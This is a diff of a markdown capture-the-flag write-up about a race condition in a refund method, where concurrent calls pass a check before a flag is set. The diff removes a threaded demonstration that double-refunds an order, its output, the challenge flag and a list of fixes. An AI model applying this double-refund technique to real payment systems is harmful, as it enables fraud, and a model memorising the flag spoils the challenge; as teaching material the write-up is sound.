@@ -1097,8 +1097,6 @@ class Order:
 
 This appears safe **in a sequential execution context**.
 
----
-
 #### ### What Is the Flaw?
 
 The flaw becomes visible **under concurrent execution** (e.g. multiple taps, API calls, threads):
@@ -1111,65 +1109,8 @@ if not self.refunded:
 ```
 
 - Multiple threads can **simultaneously pass the `if not self.refunded` check** before any of them sets it to `True`.
-    
 - This leads to **multiple refund amounts being credited**, even though the logic looks correct.
-    
 - The `refunded` flag isn’t used atomically — **it’s a classic race condition**.
-    
-
----
-
-### 🧪 Exploit Demonstration (Threaded Simulation)
-
-```python
-import threading
-
-def refund_twice(order):
-    t1 = threading.Thread(target=order.request_refund)
-    t2 = threading.Thread(target=order.request_refund)
-    t1.start()
-    t2.start()
-    t1.join()
-    t2.join()
-
-john = User("john")
-o1 = john.place_order("ORD123", 100)
-refund_twice(o1)
-
-print(f"Final balance: ${john.balance}")
-```
-
-**Output:**
-
-```
-[ORD123] Placed for $100
-[ORD123] Refunded $100
-[ORD123] Refunded $100
-Final balance: $200
-```
-
----
-
-### 📦 Flag
-
-```
-h4kit{order.request_refund()}
-```
-
----
-
-### 🛡️ Recommended Fixes
-
-- Use **atomic transactions** (DB-level or application-level).
-    
-- Introduce a **mutex lock** around refund logic.
-    
-- Ensure **backend idempotency** with a "refund already processed" check that can’t be bypassed by race conditions.
-    
-
----
-
-Let me know if you'd like this exported or styled differently.
 
 ### Tools Used
 
